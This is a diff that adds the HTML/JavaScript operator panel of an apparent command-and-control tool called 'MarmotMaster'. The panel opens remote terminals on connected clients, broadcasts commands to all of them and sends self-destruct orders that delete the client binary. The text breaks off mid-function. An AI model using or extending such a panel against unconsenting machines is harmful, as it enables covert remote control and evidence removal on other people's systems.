@@ -1,0 +1,867 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MarmotMaster - Command & Control</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/xterm@5.3.0/css/xterm.css" />
+    <style>
+        @keyframes pulse-dot {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        .pulse-dot {
+            animation: pulse-dot 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
+        }
+        @keyframes slide-in {
+            from {
+                transform: translateX(100%);
+                opacity: 0;
+            }
+            to {
+                transform: translateX(0);
+                opacity: 1;
+            }
+        }
+        .animate-slide-in {
+            animation: slide-in 0.3s ease-out;
+        }
+    </style>
+</head>
+<body class="bg-gradient-to-br from-indigo-900 via-purple-900 to-pink-900 min-h-screen p-4">
+    <div class="max-w-[1920px] mx-auto h-[calc(100vh-2rem)] flex flex-col bg-white dark:bg-gray-900 rounded-xl shadow-2xl overflow-hidden">
+        <!-- Header -->
+        <header class="bg-gradient-to-r from-indigo-600 via-purple-600 to-pink-600 text-white px-6 py-4 flex items-center justify-between flex-shrink-0">
+            <div class="flex items-center space-x-3">
+                <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 3v2m6-2v2M9 19v2m6-2v2M5 9H3m2 6H3m18-6h-2m2 6h-2M7 19h10a2 2 0 002-2V7a2 2 0 00-2-2H7a2 2 0 00-2 2v10a2 2 0 002 2zM9 9h6v6H9V9z"></path>
+                </svg>
+                <h1 class="text-2xl font-bold">MarmotMaster</h1>
+            </div>
+            <div class="flex items-center space-x-3">
+                <div class="flex items-center space-x-2 bg-white/10 backdrop-blur-sm px-4 py-2 rounded-lg">
+                    <div id="statusIndicator" class="w-3 h-3 rounded-full bg-red-500 pulse-dot"></div>
+                    <span id="statusText" class="text-sm font-medium">Disconnected</span>
+                </div>
+            </div>
+        </header>
+
+        <!-- Main Content -->
+        <div class="flex flex-1 min-h-0">
+            <!-- Sidebar -->
+            <aside class="w-80 bg-gray-50 dark:bg-gray-800 border-r border-gray-200 dark:border-gray-700 flex flex-col">
+                <div class="p-4 border-b border-gray-200 dark:border-gray-700">
+                    <h2 class="text-lg font-semibold text-gray-800 dark:text-gray-200 flex items-center">
+                        <svg class="w-5 h-5 mr-2 text-indigo-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0zm6 3a2 2 0 11-4 0 2 2 0 014 0zM7 10a2 2 0 11-4 0 2 2 0 014 0z"></path>
+                        </svg>
+                        Connected Clients
+                        <span id="clientCount" class="ml-2 px-2 py-0.5 text-xs font-medium bg-indigo-100 dark:bg-indigo-900 text-indigo-800 dark:text-indigo-200 rounded-full">0</span>
+                    </h2>
+                </div>
+                <div class="flex-1 overflow-y-auto p-4">
+                    <ul id="clientList" class="space-y-2">
+                        <li class="text-center text-gray-500 dark:text-gray-400 py-12">
+                            <svg class="w-12 h-12 mx-auto mb-3 opacity-50" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20 13V6a2 2 0 00-2-2H6a2 2 0 00-2 2v7m16 0v5a2 2 0 01-2 2H6a2 2 0 01-2-2v-5m16 0h-2.586a1 1 0 00-.707.293l-2.414 2.414a1 1 0 01-.707.293h-3.172a1 1 0 01-.707-.293l-2.414-2.414A1 1 0 006.586 13H4"></path>
+                            </svg>
+                            <p>No clients connected</p>
+                        </li>
+                    </ul>
+                </div>
+            </aside>
+
+            <!-- Main Panel -->
+            <main class="flex-1 flex flex-col p-6 min-h-0">
+                <!-- Terminal Header with Action Buttons -->
+                <div class="flex items-center justify-between mb-4">
+                    <h2 class="text-xl font-semibold text-gray-800 dark:text-gray-200">Terminal</h2>
+                    <div class="flex items-center space-x-2">
+                        <button 
+                            onclick="openBroadcastModal()"
+                            class="p-2.5 text-indigo-600 dark:text-indigo-400 hover:bg-indigo-50 dark:hover:bg-indigo-900/30 rounded-lg transition-colors"
+                            title="Broadcast command to all clients"
+                        >
+                            <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path>
+                            </svg>
+                        </button>
+                        <button 
+                            id="selfDestructClientBtn"
+                            onclick="selfDestructSelectedClient()"
+                            class="p-2.5 text-red-600 dark:text-red-400 hover:bg-red-50 dark:hover:bg-red-900/30 rounded-lg transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
+                            title="Self-destruct selected client"
+                            disabled
+                        >
+                            <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"></path>
+                            </svg>
+                        </button>
+                        <button 
+                            onclick="selfDestructAll()"
+                            class="p-2.5 text-red-600 dark:text-red-400 hover:bg-red-50 dark:hover:bg-red-900/30 rounded-lg transition-colors"
+                            title="Self-destruct all clients"
+                        >
+                            <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/>
+                            </svg>
+                        </button>
+                    </div>
+                </div>
+                
+                <div class="flex-1 bg-gray-900 rounded-lg shadow-inner p-4 flex flex-col min-h-0" id="terminalContainer">
+                    <div id="noClientMsg" class="flex-1 flex items-center justify-center text-gray-400">
+                        <div class="text-center">
+                            <svg class="w-16 h-16 mx-auto mb-4 opacity-50" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path>
+                            </svg>
+                            <p class="text-lg font-medium mb-2">No Client Selected</p>
+                            <p class="text-sm">Select a client from the sidebar to open terminal</p>
+                        </div>
+                    </div>
+                    <div id="terminal" class="flex-1 hidden"></div>
+                </div>
+            </main>
+        </div>
+    </div>
+
+    <!-- Modal Overlay -->
+    <div id="modalOverlay" class="fixed inset-0 bg-black bg-opacity-50 backdrop-blur-sm z-50 hidden items-center justify-center transition-opacity" onclick="closeModal()">
+        <div class="bg-white dark:bg-gray-800 rounded-xl shadow-2xl max-w-md w-full mx-4 transform transition-all opacity-0 scale-95" onclick="event.stopPropagation()" id="modalContent">
+            <!-- Modal content will be inserted here -->
+        </div>
+    </div>
+
+    <!-- Broadcast Command Modal -->
+    <div id="broadcastModal" class="fixed inset-0 bg-black bg-opacity-50 backdrop-blur-sm z-50 hidden items-center justify-center transition-opacity" onclick="closeBroadcastModal()">
+        <div class="bg-white dark:bg-gray-800 rounded-xl shadow-2xl max-w-lg w-full mx-4 transform transition-all opacity-0 scale-95" onclick="event.stopPropagation()" id="broadcastModalContent">
+            <div class="p-6">
+                <div class="flex items-center justify-between mb-4">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 bg-gradient-to-r from-indigo-100 to-purple-100 dark:from-indigo-900 dark:to-purple-900 rounded-lg flex items-center justify-center">
+                            <svg class="w-6 h-6 text-indigo-600 dark:text-indigo-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path>
+                            </svg>
+                        </div>
+                        <h3 class="text-xl font-semibold text-gray-900 dark:text-gray-100">
+                            Broadcast Command
+                        </h3>
+                    </div>
+                    <button 
+                        onclick="closeBroadcastModal()"
+                        class="text-gray-400 hover:text-gray-600 dark:hover:text-gray-300 transition-colors"
+                    >
+                        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
+                        </svg>
+                    </button>
+                </div>
+                
+                <div class="mb-4">
+                    <label class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
+                        Command to execute on all clients
+                    </label>
+                    <input 
+                        type="text" 
+                        id="broadcastInput" 
+                        placeholder="Enter command to execute on all clients..."
+                        class="w-full px-4 py-3 text-sm border border-gray-300 dark:border-gray-600 rounded-lg bg-white dark:bg-gray-700 text-gray-900 dark:text-gray-100 placeholder-gray-400 dark:placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:border-transparent"
+                        onkeydown="if(event.key === 'Enter') sendBroadcastCommand()"
+                    >
+                </div>
+                
+                <div class="mb-6">
+                    <p class="text-sm text-gray-600 dark:text-gray-400">
+                        <span class="font-semibold text-indigo-600 dark:text-indigo-400" id="broadcastClientCount">0</span> client(s) will receive this command
+                    </p>
+                </div>
+                
+                <div class="flex space-x-3">
+                    <button 
+                        onclick="closeBroadcastModal()"
+                        class="flex-1 px-4 py-2.5 text-sm font-semibold text-gray-700 dark:text-gray-300 bg-gray-100 dark:bg-gray-700 hover:bg-gray-200 dark:hover:bg-gray-600 rounded-lg transition-colors"
+                    >
+                        Cancel
+                    </button>
+                    <button 
+                        id="broadcastBtn"
+                        onclick="sendBroadcastCommand()"
+                        class="flex-1 px-4 py-2.5 text-sm font-semibold text-white bg-gradient-to-r from-indigo-600 to-purple-600 hover:from-indigo-700 hover:to-purple-700 rounded-lg transition-all duration-200 disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center space-x-2 shadow-md hover:shadow-lg"
+                    >
+                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path>
+                        </svg>
+                        <span>Broadcast</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/xterm@5.3.0/lib/xterm.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/xterm-addon-fit@0.8.0/lib/xterm-addon-fit.js"></script>
+    <script>
+        let ws = null;
+        let selectedClientId = null;
+        let clients = {};
+        let term = null;
+        let fitAddon = null;
+
+        function connect() {
+            // Use wss:// if page is loaded over HTTPS, otherwise use ws://
+            // For self-signed certs, browser will show warning but connection will work
+            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const wsUrl = `${protocol}//${window.location.host}/ws/ui`;
+            
+            ws = new WebSocket(wsUrl);
+
+            ws.onopen = () => {
+                updateStatus(true);
+            };
+
+            ws.onmessage = (event) => {
+                const msg = JSON.parse(event.data);
+                handleMessage(msg);
+            };
+
+            ws.onclose = () => {
+                updateStatus(false);
+                setTimeout(connect, 3000);
+            };
+
+            ws.onerror = (error) => {
+                console.error('WebSocket error:', error);
+            };
+        }
+
+        function updateStatus(connected) {
+            const indicator = document.getElementById('statusIndicator');
+            const text = document.getElementById('statusText');
+            
+            if (connected) {
+                indicator.classList.remove('bg-red-500');
+                indicator.classList.add('bg-green-500');
+                text.textContent = 'Connected';
+            } else {
+                indicator.classList.remove('bg-green-500');
+                indicator.classList.add('bg-red-500');
+                text.textContent = 'Disconnected';
+            }
+        }
+
+        function handleMessage(msg) {
+            switch(msg.type) {
+                case 'client_list':
+                    updateClientList(msg.clients || []);
+                    break;
+                case 'terminal_output':
+                    if (msg.client_id === selectedClientId && term) {
+                        if (msg.binary) {
+                            try {
+                                const binaryString = atob(msg.data);
+                                const bytes = new Uint8Array(binaryString.length);
+                                for (let i = 0; i < binaryString.length; i++) {
+                                    bytes[i] = binaryString.charCodeAt(i);
+                                }
+                                term.write(bytes);
+                            } catch (e) {
+                                console.error('Error decoding base64 terminal data:', e);
+                                term.write(msg.data);
+                            }
+                        } else {
+                            term.write(msg.data);
+                        }
+                    }
+                    break;
+            }
+        }
+
+        function updateClientList(clientList) {
+            clients = {};
+            const listEl = document.getElementById('clientList');
+            const countEl = document.getElementById('clientCount');
+            const broadcastCountEl = document.getElementById('broadcastClientCount');
+            
+            countEl.textContent = clientList.length;
+            if (broadcastCountEl) {
+                broadcastCountEl.textContent = clientList.length;
+            }
+            
+            // Update self-destruct button state
+            const selfDestructBtn = document.getElementById('selfDestructClientBtn');
+            if (selfDestructBtn) {
+                selfDestructBtn.disabled = !selectedClientId || clientList.length === 0;
+            }
+            
+            if (clientList.length === 0) {
+                listEl.innerHTML = `
+                    <li class="text-center text-gray-500 dark:text-gray-400 py-12">
+                        <svg class="w-12 h-12 mx-auto mb-3 opacity-50" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20 13V6a2 2 0 00-2-2H6a2 2 0 00-2 2v7m16 0v5a2 2 0 01-2 2H6a2 2 0 01-2-2v-5m16 0h-2.586a1 1 0 00-.707.293l-2.414 2.414a1 1 0 01-.707.293h-3.172a1 1 0 01-.707-.293l-2.414-2.414A1 1 0 006.586 13H4"></path>
+                        </svg>
+                        <p>No clients connected</p>
+                    </li>
+                `;
+                return;
+            }
+
+            listEl.innerHTML = '';
+            clientList.forEach(client => {
+                clients[client.id] = client;
+                const isActive = selectedClientId === client.id;
+                const item = document.createElement('li');
+                item.className = `group cursor-pointer transition-all duration-200 ${
+                    isActive 
+                        ? 'bg-indigo-100 dark:bg-indigo-900 border-2 border-indigo-500 shadow-md' 
+                        : 'bg-white dark:bg-gray-700 border-2 border-transparent hover:border-indigo-300 dark:hover:border-indigo-700 hover:shadow-md'
+                } rounded-lg p-4`;
+                
+                const lastSeen = new Date(client.last_seen);
+                const timeAgo = getTimeAgo(lastSeen);
+                
+                item.innerHTML = `
+                    <div class="flex items-start justify-between">
+                        <div class="flex-1 min-w-0 cursor-pointer">
+                            <div class="flex items-center space-x-2 mb-2">
+                                <svg class="w-5 h-5 ${isActive ? 'text-indigo-600 dark:text-indigo-400' : 'text-gray-400 group-hover:text-indigo-500'}" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path>
+                                </svg>
+                                <h3 class="font-semibold text-gray-800 dark:text-gray-200 truncate">${escapeHtml(client.id)}</h3>
+                            </div>
+                            <div class="flex items-center space-x-2 text-xs text-gray-500 dark:text-gray-400">
+                                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+                                </svg>
+                                <span>Last seen: ${timeAgo}</span>
+                            </div>
+                        </div>
+                        <div class="ml-2 flex items-center space-x-2 flex-shrink-0">
+                            ${isActive ? `
+                                <div class="w-2 h-2 bg-indigo-500 rounded-full animate-pulse"></div>
+                            ` : ''}
+                        </div>
+                    </div>
+                `;
+                listEl.appendChild(item);
+                
+                // Set up click handler
+                const clientInfo = item.querySelector('.flex-1');
+                
+                if (clientInfo) {
+                    clientInfo.addEventListener('click', (e) => {
+                        e.stopPropagation();
+                        selectClient(client.id);
+                    });
+                }
+            });
+        }
+
+        function getTimeAgo(date) {
+            const seconds = Math.floor((new Date() - date) / 1000);
+            if (seconds < 60) return 'just now';
+            const minutes = Math.floor(seconds / 60);
+            if (minutes < 60) return `${minutes}m ago`;
+            const hours = Math.floor(minutes / 60);
+            if (hours < 24) return `${hours}h ago`;
+            const days = Math.floor(hours / 24);
+            return `${days}d ago`;
+        }
+
+        function selectClient(clientId) {
+            if (selectedClientId === clientId && term) {
+                return;
+            }
+
+            if (term) {
+                term.dispose();
+                term = null;
+                fitAddon = null;
+            }
+
+            selectedClientId = clientId;
+            updateClientList(Object.values(clients));
+            
+            // Enable/disable self-destruct button based on selection
+            const selfDestructBtn = document.getElementById('selfDestructClientBtn');
+            if (selfDestructBtn) {
+                selfDestructBtn.disabled = !clientId;
+            }
+
+            document.getElementById('noClientMsg').classList.add('hidden');
+            const terminalEl = document.getElementById('terminal');
+            terminalEl.classList.remove('hidden');
+
+            term = new Terminal({
+                cursorBlink: true,
+                fontSize: 14,
+                fontFamily: 'Consolas, "Courier New", monospace',
+                theme: {
+                    background: '#111827',
+                    foreground: '#d1d5db',
+                    cursor: '#60a5fa',
+                    selection: '#3b82f6',
+                    black: '#000000',
+                    red: '#ef4444',
+                    green: '#10b981',
+                    yellow: '#f59e0b',
+                    blue: '#3b82f6',
+                    magenta: '#a855f7',
+                    cyan: '#06b6d4',
+                    white: '#e5e7eb',
+                    brightBlack: '#6b7280',
+                    brightRed: '#f87171',
+                    brightGreen: '#34d399',
+                    brightYellow: '#fbbf24',
+                    brightBlue: '#60a5fa',
+                    brightMagenta: '#c084fc',
+                    brightCyan: '#22d3ee',
+                    brightWhite: '#f9fafb'
+                },
+                allowProposedApi: true,
+                allowTransparency: false,
+                convertEol: false,
+                disableStdin: false,
+                macOptionIsMeta: false,
+                macOptionClickForcesSelection: false,
+                rightClickSelectsWord: false,
+                wordSeparator: ' ()[]{}"\'' 
+            });
+
+            fitAddon = new FitAddon.FitAddon();
+            term.loadAddon(fitAddon);
+            term.open(terminalEl);
+            fitAddon.fit();
+
+            term.onData((data) => {
+                if (!ws || ws.readyState !== WebSocket.OPEN || !selectedClientId) return;
+                
+                const encoder = new TextEncoder();
+                const bytes = encoder.encode(data);
+                let binary = '';
+                for (let i = 0; i < bytes.length; i++) {
+                    binary += String.fromCharCode(bytes[i]);
+                }
+                const base64Data = btoa(binary);
+                
+                const msg = {
+                    type: 'terminal_input',
+                    client_id: selectedClientId,
+                    data: base64Data,
+                    binary: true
+                };
+                ws.send(JSON.stringify(msg));
+            });
+
+            let resizeTimeout;
+            const resizeHandler = () => {
+                clearTimeout(resizeTimeout);
+                resizeTimeout = setTimeout(() => {
+                    if (fitAddon && term) {
+                        fitAddon.fit();
+                        if (ws && ws.readyState === WebSocket.OPEN && selectedClientId) {
+                            const msg = {
+                                type: 'terminal_resize',
+                                client_id: selectedClientId,
+                                rows: term.rows,
+                                cols: term.cols
+                            };
+                            ws.send(JSON.stringify(msg));
+                        }
+                    }
+                }, 100);
+            };
+            
+            window.addEventListener('resize', resizeHandler);
+
+            setTimeout(() => {
+                if (fitAddon && term) {
+                    fitAddon.fit();
+                    if (ws && ws.readyState === WebSocket.OPEN && selectedClientId) {
+                        const msg = {
+                            type: 'terminal_resize',
+                            client_id: selectedClientId,
+                            rows: term.rows,
+                            cols: term.cols
+                        };
+                        ws.send(JSON.stringify(msg));
+                    }
+                }
+            }, 100);
+        }
+
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+
+        // Modal functions
+        let currentModalCallbacks = { onConfirm: null, onCancel: null };
+        
+        function showModal(title, message, type = 'info', onConfirm = null, onCancel = null) {
+            const overlay = document.getElementById('modalOverlay');
+            const content = document.getElementById('modalContent');
+            
+            // Store callbacks globally
+            currentModalCallbacks.onConfirm = onConfirm;
+            currentModalCallbacks.onCancel = onCancel;
+            
+            // Determine icon and colors based on type
+            let icon, iconColor, buttonColor;
+            if (type === 'danger') {
+                icon = `<svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path>
+                </svg>`;
+                iconColor = 'text-red-600 dark:text-red-400';
+                buttonColor = 'bg-red-600 hover:bg-red-700';
+            } else if (type === 'warning') {
+                icon = `<svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path>
+                </svg>`;
+                iconColor = 'text-yellow-600 dark:text-yellow-400';
+                buttonColor = 'bg-yellow-600 hover:bg-yellow-700';
+            } else {
+                icon = `<svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+                </svg>`;
+                iconColor = 'text-indigo-600 dark:text-indigo-400';
+                buttonColor = 'bg-indigo-600 hover:bg-indigo-700';
+            }
+
+            const hasButtons = onConfirm !== null;
+            const buttonsHtml = hasButtons ? `
+                <div class="flex space-x-3 mt-6">
+                    <button 
+                        id="modalCancelBtn"
+                        class="flex-1 px-4 py-2.5 text-sm font-semibold text-gray-700 dark:text-gray-300 bg-gray-100 dark:bg-gray-700 hover:bg-gray-200 dark:hover:bg-gray-600 rounded-lg transition-colors"
+                    >
+                        Cancel
+                    </button>
+                    <button 
+                        id="modalConfirmBtn"
+                        class="flex-1 px-4 py-2.5 text-sm font-semibold text-white ${buttonColor} rounded-lg transition-colors shadow-md hover:shadow-lg"
+                    >
+                        Confirm
+                    </button>
+                </div>
+            ` : `
+                <div class="mt-6">
+                    <button 
+                        id="modalOkBtn"
+                        class="w-full px-4 py-2.5 text-sm font-semibold text-white ${buttonColor} rounded-lg transition-colors shadow-md hover:shadow-lg"
+                    >
+                        OK
+                    </button>
+                </div>
+            `;
+
+            content.innerHTML = `
+                <div class="p-6">
+                    <div class="flex items-start space-x-4">
+                        <div class="flex-shrink-0 ${iconColor}">
+                            ${icon}
+                        </div>
+                        <div class="flex-1">
+                            <h3 class="text-lg font-semibold text-gray-900 dark:text-gray-100 mb-2">
+                                ${escapeHtml(title)}
+                            </h3>
+                            <p class="text-sm text-gray-600 dark:text-gray-400 whitespace-pre-line">
+                                ${escapeHtml(message)}
+                            </p>
+                            ${buttonsHtml}
+                        </div>
+                    </div>
+                </div>
+            `;
+
+            // Attach event listeners
+            if (hasButtons) {
+                const confirmBtn = document.getElementById('modalConfirmBtn');
+                const cancelBtn = document.getElementById('modalCancelBtn');
+                confirmBtn.onclick = () => {
+                    closeModal();
+                    if (currentModalCallbacks.onConfirm) {
+                        currentModalCallbacks.onConfirm();
+                    }
+                };
+                cancelBtn.onclick = () => {
+                    closeModal();
+                    if (currentModalCallbacks.onCancel) {
+                        currentModalCallbacks.onCancel();
+                    }
+                };
+            } else {
+                const okBtn = document.getElementById('modalOkBtn');
+                okBtn.onclick = () => {
+                    closeModal();
+                    if (currentModalCallbacks.onConfirm) {
+                        currentModalCallbacks.onConfirm();
+                    }
+                };
+            }
+
+            overlay.classList.remove('hidden');
+            overlay.classList.add('flex');
+            setTimeout(() => {
+                content.style.opacity = '1';
+                content.style.transform = 'scale(1)';
+            }, 10);
+        }
+
+        function closeModal() {
+            const overlay = document.getElementById('modalOverlay');
+            const content = document.getElementById('modalContent');
+            content.style.opacity = '0';
+            content.style.transform = 'scale(0.95)';
+            setTimeout(() => {
+                overlay.classList.add('hidden');
+                overlay.classList.remove('flex');
+            }, 200);
+        }
+
+        // Show alert modal
+        function showAlert(message, type = 'info') {
+            return new Promise((resolve) => {
+                showModal('Alert', message, type, () => resolve(), null);
+            });
+        }
+
+        // Show confirm modal
+        function showConfirm(title, message, type = 'warning') {
+            return new Promise((resolve) => {
+                let confirmed = false;
+                showModal(
+                    title,
+                    message,
+                    type,
+                    () => {
+                        confirmed = true;
+                        resolve(true);
+                    },
+                    () => {
+                        confirmed = false;
+                        resolve(false);
+                    }
+                );
+            });
+        }
+
+        // Show notification toast
+        function showNotification(message, type = 'info') {
+            const notification = document.createElement('div');
+            notification.className = 'fixed top-4 right-4 z-50 transform transition-all duration-300 translate-x-full';
+            
+            let bgColor, icon;
+            if (type === 'danger') {
+                bgColor = 'bg-red-600';
+                icon = `<svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path>
+                </svg>`;
+            } else if (type === 'success') {
+                bgColor = 'bg-gradient-to-r from-indigo-600 to-purple-600';
+                icon = `<svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path>
+                </svg>`;
+            } else {
+                bgColor = 'bg-indigo-600';
+                icon = `<svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+                </svg>`;
+            }
+            
+            notification.innerHTML = `
+                <div class="${bgColor} text-white px-6 py-4 rounded-lg shadow-xl flex items-center space-x-3">
+                    ${icon}
+                    <span class="font-medium">${escapeHtml(message)}</span>
+                </div>
+            `;
+            
+            document.body.appendChild(notification);
+            
+            // Animate in
+            setTimeout(() => {
+                notification.classList.remove('translate-x-full');
+                notification.classList.add('translate-x-0');
+            }, 10);
+            
+            // Animate out and remove
+            setTimeout(() => {
+                notification.classList.remove('translate-x-0');
+                notification.classList.add('translate-x-full');
+                setTimeout(() => notification.remove(), 300);
+            }, 3000);
+        }
+
+        async function selfDestructSelectedClient() {
+            if (!selectedClientId) {
+                showAlert('No client selected', 'warning');
+                return;
+            }
+            
+            await selfDestruct(selectedClientId);
+        }
+
+        async function selfDestruct(clientId) {
+            const confirmed = await showConfirm(
+                'Self-Destruct Client',
+                `Are you sure you want to self-destruct client "${clientId}"?\n\nThis will delete the client binary and terminate the process.\n\nThis action cannot be undone.`,
+                'danger'
+            );
+            
+            if (!confirmed) {
+                return;
+            }
+
+            if (!ws || ws.readyState !== WebSocket.OPEN) {
+                showAlert('Not connected to server', 'warning');
+                return;
+            }
+
+            const msg = {
+                type: 'self_destruct',
+                client_id: clientId
+            };
+            ws.send(JSON.stringify(msg));
+            
+            // Show notification
+            showNotification(`Self-destruct command sent to ${escapeHtml(clientId)}`, 'danger');
+        }
+
+        async function selfDestructAll() {
+            const clientCount = Object.keys(clients).length;
+            
+            if (clientCount === 0) {
+                showAlert('No clients connected', 'warning');
+                return;
+            }
+
+            const confirmed = await showConfirm(
+                'Self-Destruct All Clients',
+                `Are you sure you want to self-destruct ALL ${clientCount} connected client(s)?\n\nThis will delete the client binaries and terminate all processes.\n\nThis action cannot be undone.`,
+                'danger'
+            );
+            
+            if (!confirmed) {
+                return;
+            }
+
+            if (!ws || ws.readyState !== WebSocket.OPEN) {
+                showAlert('Not connected to server', 'warning');
+                return;
+            }
+
+            // Send self-destruct to all clients
+            let successCount = 0;
+            for (const clientId of Object.keys(clients)) {
+                const msg = {
+                    type: 'self_destruct',
+                    client_id: clientId
+                };
+                ws.send(JSON.stringify(msg));
+                successCount++;
+            }
+            
+            // Show notification
+            showNotification(`Self-destruct command sent to ${successCount} client(s)`, 'danger');
+        }
+
+        function openBroadcastModal() {
+            const modal = document.getElementById('broadcastModal');
+            const content = document.getElementById('broadcastModalContent');
+            const input = document.getElementById('broadcastInput');
+            
+            modal.classList.remove('hidden');
+            modal.classList.add('flex');
+            setTimeout(() => {
+                content.style.opacity = '1';
+                content.style.transform = 'scale(1)';
+                input.focus();
+            }, 10);
+        }
+
+        function closeBroadcastModal() {
+            const modal = document.getElementById('broadcastModal');
+            const content = document.getElementById('broadcastModalContent');
+            const input = document.getElementById('broadcastInput');
+            
+            content.style.opacity = '0';
+            content.style.transform = 'scale(0.95)';
+            setTimeout(() => {
+                modal.classList.add('hidden');
+                modal.classList.remove('flex');
+                input.value = '';
+            }, 200);
+        }
+
+        async function sendBroadcastCommand() {
+            const input = document.getElementById('broadcastInput');
+            const button = document.getElementById('broadcastBtn');
+            const command = input.value.trim();
+            
+            if (!command) {
+                input.focus();
+                return;
+            }
+
+            if (!ws || ws.readyState !== WebSocket.OPEN) {
+                closeBroadcastModal();
+                showAlert('Not connected to server', 'warning');
+                return;
+            }
+
+            const clientCount = Object.keys(clients).length;
+            if (clientCount === 0) {
+                closeBroadcastModal();
+                showAlert('No clients connected', 'warning');
+                return;
+            }
+
+            // Close the broadcast modal first, then show confirmation
+            closeBroadcastModal();
+            
+            // Wait for modal to close before showing confirmation
